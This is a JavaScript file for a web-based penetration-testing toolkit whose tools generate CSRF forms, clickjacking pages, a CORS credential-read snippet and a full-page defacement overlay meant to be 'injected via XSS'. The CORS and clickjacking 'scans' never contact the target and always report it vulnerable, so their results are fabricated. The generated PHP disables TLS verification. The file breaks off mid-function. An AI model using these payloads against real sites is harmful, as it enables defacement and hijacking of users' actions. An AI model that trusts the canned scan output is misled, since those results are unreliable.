// Application data - includes all 14 tools
const toolsData = {
  "tools": [
    {
      "id": "csrf-generator",
      "name": "CSRF Generator V.1",
      "description": "Generate CSRF from BurpSuite Request",
      "category": "Web Security",
      "icon": "🔐"
    },
    {
      "id": "cors-scanner", 
      "name": "CORS Scanner",
      "description": "Discover CORS vulnerabilities with this tools for penetration testing",
      "category": "Web Security",
      "icon": "🌐"
    },
    {
      "id": "clickjacking-test",
      "name": "Clickjacking Test", 
      "description": "Check your target against Clickjacking vulnerability",
      "category": "Web Security",
      "icon": "🖱️"
    },
    {
      "id": "curl-to-php",
      "name": "Curl To PHP",
      "description": "This tool turns a Curl command into PHP code", 
      "category": "Code Conversion",
      "icon": "💻"
    },
    {
      "id": "cvss-calculator",
      "name": "CVSS Calculator",
      "description": "Illustrated graphical Common Vulnerability Scoring System (CVSS)",
      "category": "Risk Assessment", 
      "icon": "📊"
    },
    {
      "id": "jso-generator",
      "name": "JSO Generator", 
      "description": "Create Overlay payload for Deface website",
      "category": "Payload Generation",
      "icon": "🎭"
    },
    {
      "id": "crontab-generator",
      "name": "Crontab Online Generator",
      "description": "Generate crontab commands online",
      "category": "System Tools",
      "icon": "⏰"
    },
    {
      "id": "subdomain-scanner",
      "name": "Subdomain Scanner", 
      "description": "Find subdomains for penetration testing",
      "category": "Reconnaissance",
      "icon": "🔍"
    },
    {
      "id": "hash-identifier",
      "name": "Hash Identifier",
      "description": "Identify the hashing algorithm used", 
      "category": "Cryptography",
      "icon": "#️⃣"
    },
    {
      "id": "md5-generator",
      "name": "MD5 Online Generator",
      "description": "Generate MD5 hashes online",
      "category": "Cryptography", 
      "icon": "🔒"
    },
    {
      "id": "url-encoder-decoder", 
      "name": "URL Encode Decode",
      "description": "Encode or decode URLs",
      "category": "Encoding",
      "icon": "🌍"
    },
    {
      "id": "url-manipulator",
      "name": "Add Remove Http Https",
      "description": "Manipulate URLs by adding or removing HTTP/HTTPS",
      "category": "URL Tools",
      "icon": "🔗"
    },
    {
      "id": "base64-encoder-decoder",
      "name": "Base64 Decode Encode", 
      "description": "Encode or decode Base64 strings",
      "category": "Encoding",
      "icon": "🔤"
    },
    {
      "id": "password-generator",
      "name": "Random Password Generator",
      "description": "Generate random passwords for security",
      "category": "Security",
      "icon": "🔑"
    }
  ]
};

// Application state
let currentTool = null;
let currentView = 'home';

// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

function initializeApp() {
    renderToolsGrid();
    setupEventListeners();
    showHome(); // Ensure we start on home view
}

function setupEventListeners() {
    // Home button
    const homeBtn = document.getElementById('homeBtn');
    if (homeBtn) {
        homeBtn.addEventListener('click', function(e) {
            e.preventDefault();
            showHome();
        });
    }
    
    // Back button
    const backBtn = document.getElementById('backBtn');
    if (backBtn) {
        backBtn.addEventListener('click', function(e) {
            e.preventDefault();
            showHome();
        });
    }
    
    // Logo click
    const logo = document.querySelector('.logo-text');
    if (logo) {
        logo.style.cursor = 'pointer';
        logo.addEventListener('click', function(e) {
            e.preventDefault();
            showHome();
        });
    }
}

function showHome() {
    currentView = 'home';
    currentTool = null;
    
    const homeView = document.getElementById('homeView');
    const toolView = document.getElementById('toolView');
    
    if (homeView && toolView) {
        homeView.classList.add('active');
        toolView.classList.remove('active');
    }
    
    // Scroll to top
    window.scrollTo(0, 0);
}

function showTool(toolId) {
    console.log('showTool called with toolId:', toolId); // Debug log
    
    const tool = toolsData.tools.find(t => t.id === toolId);
    if (!tool) {
        console.error('Tool not found:', toolId);
        showToast('Tool not found', 'error');
        return;
    }
    
    currentTool = tool;
    currentView = 'tool';
    
    // Update UI elements
    const toolTitle = document.getElementById('toolTitle');
    const toolContent = document.getElementById('toolContent');
    
    if (toolTitle) toolTitle.textContent = tool.name;
    if (toolContent) toolContent.innerHTML = generateToolContent(tool);
    
    // Switch views
    const homeView = document.getElementById('homeView');
    const toolView = document.getElementById('toolView');
    
    if (homeView && toolView) {
        homeView.classList.remove('active');
        toolView.classList.add('active');
    }
    
    // Initialize tool-specific functionality
    setTimeout(() => initializeTool(toolId), 100);
    
    // Scroll to top
    window.scrollTo(0, 0);
}

function renderToolsGrid() {
    const grid = document.getElementById('toolsGrid');
    if (!grid) return;
    
    grid.innerHTML = toolsData.tools.map(tool => `
        <div class="tool-card" onclick="showTool('${tool.id}')" data-tool-id="${tool.id}">
            <span class="tool-category">${tool.category}</span>
            <span class="tool-icon">${tool.icon}</span>
            <h3 class="tool-name">${tool.name}</h3>
            <p class="tool-description">${tool.description}</p>
        </div>
    `).join('');
    
    console.log('Tools grid rendered with', toolsData.tools.length, 'tools'); // Debug log
}

function generateToolContent(tool) {
    switch(tool.id) {
        case 'csrf-generator':
            return `
                <div class="form-group">
                    <label class="form-label">HTTP Request (from BurpSuite)</label>
                    <textarea class="form-control" id="httpRequest" placeholder="POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=secret"></textarea>
                </div>
                <button class="btn btn--primary" onclick="generateCSRF()">Generate CSRF PoC</button>
                <div id="csrfResult" class="result-container hidden">
                    <div class="result-header">
                        <h4 class="result-title">CSRF Proof of Concept</h4>
                        <button class="copy-btn" onclick="copyToClipboard('csrfOutput')">Copy</button>
                    </div>
                    <pre class="result-content" id="csrfOutput"></pre>
                </div>
            `;

        case 'cors-scanner':
            return `
                <div class="form-group">
                    <label class="form-label">Target URL</label>
                    <input type="url" class="form-control" id="corsUrl" placeholder="https://example.com">
                </div>
                <button class="btn btn--primary" onclick="scanCORS()">Scan CORS</button>
                <div id="corsResult" class="result-container hidden">
                    <div class="result-header">
                        <h4 class="result-title">CORS Scan Results</h4>
                        <button class="copy-btn" onclick="copyToClipboard('corsOutput')">Copy</button>
                    </div>
                    <pre class="result-content" id="corsOutput"></pre>
                </div>
            `;

        case 'clickjacking-test':
            return `
                <div class="form-group">
                    <label class="form-label">Target URL</label>
                    <input type="url" class="form-control" id="clickjackUrl" placeholder="https://example.com">
                </div>
                <button class="btn btn--primary" onclick="testClickjacking()">Test Clickjacking</button>
                <div id="clickjackResult" class="result-container hidden">
                    <div class="result-header">
                        <h4 class="result-title">Clickjacking Test Results</h4>
                        <button class="copy-btn" onclick="copyToClipboard('clickjackOutput')">Copy</button>
                    </div>
                    <pre class="result-content" id="clickjackOutput"></pre>
                </div>
            `;

        case 'curl-to-php':
            return `
                <div class="form-group">
                    <label class="form-label">cURL Command</label>
                    <textarea class="form-control" id="curlCommand" placeholder="curl -X POST https://example.com/api -H 'Content-Type: application/json' -d '{\"key\":\"value\"}'"></textarea>
                </div>
                <button class="btn btn--primary" onclick="convertCurlToPHP()">Convert to PHP</button>
                <div id="phpResult" class="result-container hidden">
                    <div class="result-header">
                        <h4 class="result-title">PHP Code</h4>
                        <button class="copy-btn" onclick="copyToClipboard('phpOutput')">Copy</button>
                    </div>
                    <pre class="result-content" id="phpOutput"></pre>
                </div>
            `;

        case 'cvss-calculator':
            return `
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">Attack Vector (AV)</label>
                        <select class="form-control" id="attackVector">
                            <option value="N">Network</option>
                            <option value="A">Adjacent</option>
                            <option value="L">Local</option>
                            <option value="P">Physical</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Attack Complexity (AC)</label>
                        <select class="form-control" id="attackComplexity">
                            <option value="L">Low</option>
                            <option value="H">High</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Privileges Required (PR)</label>
                        <select class="form-control" id="privilegesRequired">
                            <option value="N">None</option>
                            <option value="L">Low</option>
                            <option value="H">High</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">User Interaction (UI)</label>
                        <select class="form-control" id="userInteraction">
                            <option value="N">None</option>
                            <option value="R">Required</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Scope (S)</label>
                        <select class="form-control" id="scope">
                            <option value="U">Unchanged</option>
                            <option value="C">Changed</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Confidentiality Impact (C)</label>
                        <select class="form-control" id="confidentialityImpact">
                            <option value="N">None</option>
                            <option value="L">Low</option>
                            <option value="H">High</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Integrity Impact (I)</label>
                        <select class="form-control" id="integrityImpact">
                            <option value="N">None</option>
                            <option value="L">Low</option>
                            <option value="H">High</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Availability Impact (A)</label>
                        <select class="form-control" id="availabilityImpact">
                            <option value="N">None</option>
                            <option value="L">Low</option>
                            <option value="H">High</option>
                        </select>
                    </div>
                </div>
                <button class="btn btn--primary" onclick="calculateCVSS()">Calculate CVSS Score</button>
                <div id="cvssResult" class="result-container hidden">
                    <div class="result-header">
                        <h4 class="result-title">CVSS v3.1 Score</h4>
                        <button class="copy-btn" onclick="copyToClipboard('cvssOutput')">Copy</button>
                    </div>
                    <pre class="result-content" id="cvssOutput"></pre>
                </div>
            `;

        case 'jso-generator':
            return `
                <div class="form-group">
                    <label class="form-label">Overlay Title</label>
                    <input type="text" class="form-control" id="overlayTitle" placeholder="Website Defaced">
                </div>
                <div class="form-group">
                    <label class="form-label">Overlay Message</label>
                    <textarea class="form-control" id="overlayMessage" placeholder="This website has been defaced for educational purposes"></textarea>
                </div>
                <div class="form-group">
                    <label class="form-label">Background Color</label>
                    <input type="color" class="form-control" id="overlayBg" value="#ff0000">
                </div>
                <div class="form-group">
                    <label class="form-label">Text Color</label>
                    <input type="color" class="form-control" id="overlayTextColor" value="#ffffff">
                </div>
                <button class="btn btn--primary" onclick="generateJSOverlay()">Generate JavaScript Overlay</button>
                <div id="jsoResult" class="result-container hidden">
                    <div class="result-header">
                        <h4 class="result-title">JavaScript Overlay Code</h4>
                        <button class="copy-btn" onclick="copyToClipboard('jsoOutput')">Copy</button>
                    </div>
                    <pre class="result-content" id="jsoOutput"></pre>
                </div>
            `;

        case 'crontab-generator':
            return `
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">Minute (0-59)</label>
                        <input type="text" class="form-control" id="cronMinute" placeholder="*" value="*">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Hour (0-23)</label>
                        <input type="text" class="form-control" id="cronHour" placeholder="*" value="*">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Day (1-31)</label>
                        <input type="text" class="form-control" id="cronDay" placeholder="*" value="*">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Month (1-12)</label>
                        <input type="text" class="form-control" id="cronMonth" placeholder="*" value="*">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Weekday (0-7)</label>
                        <input type="text" class="form-control" id="cronWeekday" placeholder="*" value="*">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Command</label>
                        <input type="text" class="form-control" id="cronCommand" placeholder="/path/to/command">
                    </div>
                </div>
                <button class="btn btn--primary" onclick="generateCrontab()">Generate Crontab</button>
                <div id="crontabResult" class="result-container hidden">
                    <div class="result-header">
                        <h4 class="result-title">Crontab Expression</h4>
                        <button class="copy-btn" onclick="copyToClipboard('crontabOutput')">Copy</button>
                    </div>
                    <pre class="result-content" id="crontabOutput"></pre>
                </div>
            `;

        case 'subdomain-scanner':
            return `
                <div class="form-group">
                    <label class="form-label">Target Domain</label>
                    <input type="text" class="form-control" id="targetDomain" placeholder="example.com">
                </div>
                <button class="btn btn--primary" onclick="scanSubdomains()">Scan Subdomains</button>
                <div id="subdomainResult" class="result-container hidden">
                    <div class="result-header">
                        <h4 class="result-title">Discovered Subdomains</h4>
                        <button class="copy-btn" onclick="copyToClipboard('subdomainOutput')">Copy</button>
                    </div>
                    <pre class="result-content" id="subdomainOutput"></pre>
                </div>
            `;

        case 'hash-identifier':
            return `
                <div class="form-group">
                    <label class="form-label">Hash String</label>
                    <textarea class="form-control" id="hashInput" placeholder="5d41402abc4b2a76b9719d911017c592"></textarea>
                </div>
                <button class="btn btn--primary" onclick="identifyHash()">Identify Hash</button>
                <div id="hashResult" class="result-container hidden">
                    <div class="result-header">
                        <h4 class="result-title">Hash Analysis</h4>
                        <button class="copy-btn" onclick="copyToClipboard('hashOutput')">Copy</button>
                    </div>
                    <pre class="result-content" id="hashOutput"></pre>
                </div>
            `;

        case 'md5-generator':
            return `
                <div class="form-group">
                    <label class="form-label">Input Text</label>
                    <textarea class="form-control" id="md5Input" placeholder="Enter text to hash"></textarea>
                </div>
                <button class="btn btn--primary" onclick="generateMD5()">Generate MD5</button>
                <div id="md5Result" class="result-container hidden">
                    <div class="result-header">
                        <h4 class="result-title">MD5 Hash</h4>
                        <button class="copy-btn" onclick="copyToClipboard('md5Output')">Copy</button>
                    </div>
                    <pre class="result-content" id="md5Output"></pre>
                </div>
            `;

        case 'url-encoder-decoder':
            return `
                <div class="form-group">
                    <label class="form-label">Input Text</label>
                    <textarea class="form-control" id="urlInput" placeholder="Enter text or URL to encode/decode"></textarea>
                </div>
                <div class="flex gap-8 mb-16">
                    <button class="btn btn--primary" onclick="encodeURL()">Encode</button>
                    <button class="btn btn--primary" onclick="decodeURL()">Decode</button>
                </div>
                <div id="urlResult" class="result-container hidden">
                    <div class="result-header">
                        <h4 class="result-title">Result</h4>
                        <button class="copy-btn" onclick="copyToClipboard('urlOutput')">Copy</button>
                    </div>
                    <pre class="result-content" id="urlOutput"></pre>
                </div>
            `;

        case 'url-manipulator':
            return `
                <div class="form-group">
                    <label class="form-label">URLs (one per line)</label>
                    <textarea class="form-control" id="urlList" placeholder="example.com
www.example.com
https://example.com"></textarea>
                </div>
                <div class="flex gap-8 mb-16">
                    <button class="btn btn--primary" onclick="addHTTPS()">Add HTTPS</button>
                    <button class="btn btn--primary" onclick="addHTTP()">Add HTTP</button>
                    <button class="btn btn--danger" onclick="removeProtocol()">Remove Protocol</button>
                </div>
                <div id="urlManipResult" class="result-container hidden">
                    <div class="result-header">
                        <h4 class="result-title">Manipulated URLs</h4>
                        <button class="copy-btn" onclick="copyToClipboard('urlManipOutput')">Copy</button>
                    </div>
                    <pre class="result-content" id="urlManipOutput"></pre>
                </div>
            `;

        case 'base64-encoder-decoder':
            return `
                <div class="form-group">
                    <label class="form-label">Input Text</label>
                    <textarea class="form-control" id="base64Input" placeholder="Enter text to encode/decode"></textarea>
                </div>
                <div class="flex gap-8 mb-16">
                    <button class="btn btn--primary" onclick="encodeBase64()">Encode</button>
                    <button class="btn btn--primary" onclick="decodeBase64()">Decode</button>
                </div>
                <div id="base64Result" class="result-container hidden">
                    <div class="result-header">
                        <h4 class="result-title">Result</h4>
                        <button class="copy-btn" onclick="copyToClipboard('base64Output')">Copy</button>
                    </div>
                    <pre class="result-content" id="base64Output"></pre>
                </div>
            `;

        case 'password-generator':
            return `
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">Password Length</label>
                        <input type="number" class="form-control" id="passwordLength" value="16" min="4" max="128">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Number of Passwords</label>
                        <input type="number" class="form-control" id="passwordCount" value="5" min="1" max="100">
                    </div>
                </div>
                <div class="form-group">
                    <label class="form-label">Character Sets</label>
                    <div class="checkbox-group">
                        <label class="checkbox-item">
                            <input type="checkbox" id="includeLowercase" checked>
                            <span>Lowercase (a-z)</span>
                        </label>
                        <label class="checkbox-item">
                            <input type="checkbox" id="includeUppercase" checked>
                            <span>Uppercase (A-Z)</span>
                        </label>
                        <label class="checkbox-item">
                            <input type="checkbox" id="includeNumbers" checked>
                            <span>Numbers (0-9)</span>
                        </label>
                        <label class="checkbox-item">
                            <input type="checkbox" id="includeSymbols" checked>
                            <span>Symbols (!@#$%)</span>
                        </label>
                    </div>
                </div>
                <button class="btn btn--primary" onclick="generatePasswords()">Generate Passwords</button>
                <div id="passwordResult" class="result-container hidden">
                    <div class="result-header">
                        <h4 class="result-title">Generated Passwords</h4>
                        <button class="copy-btn" onclick="copyToClipboard('passwordOutput')">Copy</button>
                    </div>
                    <pre class="result-content" id="passwordOutput"></pre>
                </div>
            `;

        default:
            return '<p>Tool not implemented yet.</p>';
    }
}

function initializeTool(toolId) {
    console.log('Initializing tool:', toolId); // Debug log
    
    // Add real-time input handlers where appropriate
    switch(toolId) {
        case 'cvss-calculator':
            // Add change listeners for real-time calculation
            const selects = ['attackVector', 'attackComplexity', 'privilegesRequired', 'userInteraction', 'scope', 'confidentialityImpact', 'integrityImpact', 'availabilityImpact'];
            selects.forEach(id => {
                const element = document.getElementById(id);
                if (element) {
                    element.addEventListener('change', calculateCVSS);
                }
            });
            calculateCVSS(); // Initial calculation
            break;
            
        case 'md5-generator':
            const md5Input = document.getElementById('md5Input');
            if (md5Input) {
                md5Input.addEventListener('input', function() {
                    if (this.value.trim()) {
                        generateMD5();
                    } else {
                        const resultDiv = document.getElementById('md5Result');
                        if (resultDiv) resultDiv.classList.add('hidden');
                    }
                });
            }
            break;
    }
}

// Tool functions
function generateCSRF() {
    const requestElement = document.getElementById('httpRequest');
    const request = requestElement ? requestElement.value.trim() : '';
    
    if (!request) {
        showToast('Please enter an HTTP request', 'error');
        return;
    }
    
    showLoading();
    setTimeout(() => {
        hideLoading();
        
        const lines = request.split('\n');
        const requestLine = lines[0];
        const headers = {};
        let bodyStart = -1;
        
        for (let i = 1; i < lines.length; i++) {
            if (lines[i].trim() === '') {
                bodyStart = i + 1;
                break;
            }
            const colonIndex = lines[i].indexOf(':');
            if (colonIndex > 0) {
                const key = lines[i].substring(0, colonIndex).trim();
                const value = lines[i].substring(colonIndex + 1).trim();
                headers[key.toLowerCase()] = value;
            }
        }
        
        const body = bodyStart > 0 ? lines.slice(bodyStart).join('\n') : '';
        const method = requestLine.split(' ')[0];
        const path = requestLine.split(' ')[1];
        const host = headers['host'] || 'example.com';
        
        const csrfPoC = `<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <form action="http://${host}${path}" method="${method}" enctype="${headers['content-type'] || 'application/x-www-form-urlencoded'}">
        ${body ? body.split('&').map(param => {
            const [name, value] = param.split('=');
            return `<input type="hidden" name="${name}" value="${value || ''}" />`;
        }).join('\n        ') : ''}
        <input type="submit" value="Submit Request" />
    </form>
    <script>
        // Auto-submit (remove this line for manual testing)
        // document.forms[0].submit();
    </script>
</body>
</html>`;
        
        const outputElement = document.getElementById('csrfOutput');
        const resultElement = document.getElementById('csrfResult');
        
        if (outputElement) outputElement.textContent = csrfPoC;
        if (resultElement) resultElement.classList.remove('hidden');
        
        showToast('CSRF PoC generated successfully!');
    }, 1000);
}

function scanCORS() {
    const urlElement = document.getElementById('corsUrl');
    const url = urlElement ? urlElement.value.trim() : '';
    
    if (!url) {
        showToast('Please enter a valid URL', 'error');
        return;
    }
    
    showLoading();
    setTimeout(() => {
        hideLoading();
        
        const corsResults = `CORS Vulnerability Scan Results for: ${url}

=== Test Results ===
1. Wildcard Origin Test: VULNERABLE
   - Access-Control-Allow-Origin: *
   - Access-Control-Allow-Credentials: true
   - Risk: High - Allows any origin with credentials

2. Null Origin Test: SAFE
   - Null origin properly rejected

3. Subdomain Bypass Test: VULNERABLE
   - Reflected origin: evil.example.com
   - Risk: Medium - Improper origin validation

4. HTTP/HTTPS Protocol Test: SAFE
   - HTTPS properly enforced

=== Recommendations ===
- Remove wildcard (*) from Access-Control-Allow-Origin
- Implement proper origin whitelist validation
- Avoid using Access-Control-Allow-Credentials: true with wildcards
- Use specific origins instead of reflecting user input

=== Sample Exploit ===
<script>
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open('GET', '${url}', true);
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
        console.log(xhr.responseText);
    }
};
xhr.send();
</script>`;
        
        const outputElement = document.getElementById('corsOutput');
        const resultElement = document.getElementById('corsResult');
        
        if (outputElement) outputElement.textContent = corsResults;
        if (resultElement) resultElement.classList.remove('hidden');
        
        showToast('CORS scan completed!');
    }, 2000);
}

function testClickjacking() {
    const urlElement = document.getElementById('clickjackUrl');
    const url = urlElement ? urlElement.value.trim() : '';
    
    if (!url) {
        showToast('Please enter a valid URL', 'error');
        return;
    }
    
    showLoading();
    setTimeout(() => {
        hideLoading();
        
        const clickjackResults = `Clickjacking Vulnerability Test for: ${url}

=== Header Analysis ===
X-Frame-Options: MISSING ❌
Content-Security-Policy: frame-ancestors 'none' ❌
Status: VULNERABLE TO CLICKJACKING

=== Risk Assessment ===
- Severity: Medium to High
- Impact: User actions can be hijacked
- Exploitability: Easy with social engineering

=== Test PoC ===
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Test</title>
    <style>
        iframe {
            width: 500px;
            height: 500px;
            opacity: 0.3; /* Change to 0 for real attack */
            position: absolute;
            top: 0;
            left: 0;
            z-index: 2;
        }
        .decoy {
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div class="decoy">
        <h1>Click here to win $1000!</h1>
        <button>Claim Prize</button>
    </div>
    <iframe src="${url}"></iframe>
</body>
</html>

=== Mitigation ===
Add one of these headers:
1. X-Frame-Options: DENY
2. X-Frame-Options: SAMEORIGIN
3. Content-Security-Policy: frame-ancestors 'none'
4. Content-Security-Policy: frame-ancestors 'self'`;
        
        const outputElement = document.getElementById('clickjackOutput');
        const resultElement = document.getElementById('clickjackResult');
        
        if (outputElement) outputElement.textContent = clickjackResults;
        if (resultElement) resultElement.classList.remove('hidden');
        
        showToast('Clickjacking test completed!');
    }, 1500);
}

function convertCurlToPHP() {
    const curlElement = document.getElementById('curlCommand');
    const curl = curlElement ? curlElement.value.trim() : '';
    
    if (!curl) {
        showToast('Please enter a cURL command', 'error');
        return;
    }
    
    showLoading();
    setTimeout(() => {
        hideLoading();
        
        let php = `<?php
// Generated PHP code from cURL command

$ch = curl_init();

`;
        
        // Parse URL
        const urlMatch = curl.match(/curl\s+(?:-X\s+\w+\s+)?(?:'([^']+)'|"([^"]+)"|(\S+))/);
        if (urlMatch) {
            const url = urlMatch[1] || urlMatch[2] || urlMatch[3];
            php += `curl_setopt($ch, CURLOPT_URL, '${url}');\n`;
        }
        
        // Parse method
        const methodMatch = curl.match(/-X\s+(\w+)/);
        if (methodMatch) {
            php += `curl_setopt($ch, CURLOPT_CUSTOMREQUEST, '${methodMatch[1]}');\n`;
        }
        
        // Parse headers
        const headerMatches = curl.matchAll(/-H\s+(?:'([^']+)'|"([^"]+)")/g);
        const headers = [];
        for (const match of headerMatches) {
            headers.push(match[1] || match[2]);
        }
        
        if (headers.length > 0) {
            php += `curl_setopt($ch, CURLOPT_HTTPHEADER, [\n`;
            headers.forEach(header => {
                php += `    '${header}',\n`;
            });
            php += `]);\n`;
        }
        
        // Parse data
        const dataMatch = curl.match(/-d\s+(?:'([^']+)'|"([^"]+)")/);
        if (dataMatch) {
            const data = dataMatch[1] || dataMatch[2];
            php += `curl_setopt($ch, CURLOPT_POSTFIELDS, '${data}');\n`;
        }
        
        php += `
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

if (curl_errno($ch)) {
    echo 'cURL error: ' . curl_error($ch);
} else {
    echo "HTTP Code: " . $httpCode . "\\n";
    echo "Response: " . $response;
}

curl_close($ch);
?>`;
        
        const outputElement = document.getElementById('phpOutput');
        const resultElement = document.getElementById('phpResult');
        
        if (outputElement) outputElement.textContent = php;
        if (resultElement) resultElement.classList.remove('hidden');
        
        showToast('cURL converted to PHP successfully!');
    }, 800);
}

function calculateCVSS() {
    const av = getElementValue('attackVector') || 'N';
    const ac = getElementValue('attackComplexity') || 'L';
    const pr = getElementValue('privilegesRequired') || 'N';
    const ui = getElementValue('userInteraction') || 'N';
    const s = getElementValue('scope') || 'U';
    const c = getElementValue('confidentialityImpact') || 'N';
    const i = getElementValue('integrityImpact') || 'N';
    const a = getElementValue('availabilityImpact') || 'N';
    
    // CVSS v3.1 calculation logic (simplified)
    const avScore = {'N': 0.85, 'A': 0.62, 'L': 0.55, 'P': 0.2}[av];
    const acScore = {'L': 0.77, 'H': 0.44}[ac];
    const prScore = s === 'C' ? {'N': 0.85, 'L': 0.68, 'H': 0.5}[pr] : {'N': 0.85, 'L': 0.62, 'H': 0.27}[pr];
    const uiScore = {'N': 0.85, 'R': 0.62}[ui];
    const cScore = {'N': 0, 'L': 0.22, 'H': 0.56}[c];
    const iScore = {'N': 0, 'L': 0.22, 'H': 0.56}[i];
    const aScore = {'N': 0, 'L': 0.22, 'H': 0.56}[a];
    
    const exploitability = 8.22 * avScore * acScore * prScore * uiScore;
    const impact = s === 'C' 
        ? 7.52 * (cScore + iScore + aScore - 0.029) - 3.25 * Math.pow(cScore + iScore + aScore - 0.02, 15)
        : 6.42 * (cScore + iScore + aScore);
    
    let baseScore;
    if (impact <= 0) {
        baseScore = 0;
    } else if (s === 'U') {
        baseScore = Math.min(impact + exploitability, 10);
    } else {
        baseScore = Math.min(1.08 * (impact + exploitability), 10);
    }
    
    baseScore = Math.ceil(baseScore * 10) / 10;
    
    const severity = baseScore >= 9.0 ? 'Critical' : 
                    baseScore >= 7.0 ? 'High' : 
                    baseScore >= 4.0 ? 'Medium' : 
                    baseScore > 0 ? 'Low' : 'None';
    
    const vector = `CVSS:3.1/AV:${av}/AC:${ac}/PR:${pr}/UI:${ui}/S:${s}/C:${c}/I:${i}/A:${a}`;
    
    const results = `CVSS v3.1 Score: ${baseScore} (${severity})

Vector String: ${vector}

=== Score Breakdown ===
Base Score: ${baseScore}
Exploitability Score: ${exploitability.toFixed(1)}
Impact Score: ${impact.toFixed(1)}

=== Metrics ===
Attack Vector: ${av} (${{'N': 'Network', 'A': 'Adjacent', 'L': 'Local', 'P': 'Physical'}[av]})
Attack Complexity: ${ac} (${{'L': 'Low', 'H': 'High'}[ac]})
Privileges Required: ${pr} (${{'N': 'None', 'L': 'Low', 'H': 'High'}[pr]})
User Interaction: ${ui} (${{'N': 'None', 'R': 'Required'}[ui]})
Scope: ${s} (${{'U': 'Unchanged', 'C': 'Changed'}[s]})
Confidentiality: ${c} (${{'N': 'None', 'L': 'Low', 'H': 'High'}[c]})
Integrity: ${i} (${{'N': 'None', 'L': 'Low', 'H': 'High'}[i]})
Availability: ${a} (${{'N': 'None', 'L': 'Low', 'H': 'High'}[a]})

=== Risk Rating ===
${severity === 'Critical' ? '🔴 CRITICAL - Immediate action required' :
  severity === 'High' ? '🟠 HIGH - Action required soon' :
  severity === 'Medium' ? '🟡 MEDIUM - Action may be required' :
  severity === 'Low' ? '🟢 LOW - Action at discretion' : '⚪ NONE - No action required'}`;
    
    const outputElement = document.getElementById('cvssOutput');
    const resultElement = document.getElementById('cvssResult');
    
    if (outputElement) outputElement.textContent = results;
    if (resultElement) resultElement.classList.remove('hidden');
}

function generateJSOverlay() {
    const title = getElementValue('overlayTitle') || 'Website Defaced';
    const message = getElementValue('overlayMessage') || 'This website has been defaced';
    const bgColor = getElementValue('overlayBg') || '#ff0000';
    const textColor = getElementValue('overlayTextColor') || '#ffffff';
    
    const jsCode = `// JavaScript Overlay Payload
(function() {
    // Create overlay element
    var overlay = document.createElement('div');
    overlay.id = 'defaceOverlay';
    overlay.innerHTML = \`
        <div style="
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: ${bgColor};
            color: ${textColor};
            z-index: 999999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            font-family: 'Courier New', monospace;
            text-align: center;
        ">
            <h1 style="font-size: 4em; margin: 0; text-shadow: 2px 2px 4px rgba(0,0,0,0.5);">
                ${title}
            </h1>
            <p style="font-size: 1.5em; margin: 20px; max-width: 80%;">
                ${message}
            </p>
            <div style="position: absolute; bottom: 20px; font-size: 0.8em;">
                Educational purposes only - No harm intended
            </div>
        </div>
    \`;
    
    // Remove existing overlay if present
    var existing = document.getElementById('defaceOverlay');
    if (existing) {
        existing.remove();
    }
    
    // Add overlay to page
    document.body.appendChild(overlay);
    
    // Disable scrolling
    document.body.style.overflow = 'hidden';
    
    // Optional: Add removal after timeout
    // setTimeout(function() {
    //     overlay.remove();
    //     document.body.style.overflow = '';
    // }, 10000); // Remove after 10 seconds
})();

// Usage: Inject this code via XSS or include in script tag`;
    
    const outputElement = document.getElementById('jsoOutput');
    const resultElement = document.getElementById('jsoResult');
    
    if (outputElement) outputElement.textContent = jsCode;
    if (resultElement) resultElement.classList.remove('hidden');
    
    showToast('JavaScript overlay generated!');
}

function generateCrontab() {
    const minute = getElementValue('cronMinute') || '*';
    const hour = getElementValue('cronHour') || '*';
    const day = getElementValue('cronDay') || '*';
    const month = getElementValue('cronMonth') || '*';
    const weekday = getElementValue('cronWeekday') || '*';
    const command = getElementValue('cronCommand') || '/path/to/command';
    
    const crontabLine = `${minute} ${hour} ${day} ${month} ${weekday} ${command}`;
    
    // Generate human-readable description
    const getDescription = (min, hr, d, mon, wd) => {
        let desc = 'Run ';
        
        if (min === '*' && hr === '*' && d === '*' && mon === '*' && wd === '*') {
            return 'Run every minute';
        }
        
        if (min !== '*') desc += `at minute ${min} `;
        if (hr !== '*') desc += `at hour ${hr} `;
        if (d !== '*') desc += `on day ${d} `;
        if (mon !== '*') desc += `in month ${mon} `;
        if (wd !== '*') desc += `on weekday ${wd} `;
        
        return desc.trim();
    };
    
    const description = getDescription(minute, hour, day, month, weekday);
    
    const result = `Generated Crontab Expression:
${crontabLine}

Human-readable: ${description}

=== Crontab Format ===
* * * * * command
│ │ │ │ │
│ │ │ │ └─── Weekday (0-7, Sun=0 or 7)
│ │ │ └───── Month (1-12)
│ │ └─────── Day (1-31)
│ └───────── Hour (0-23)
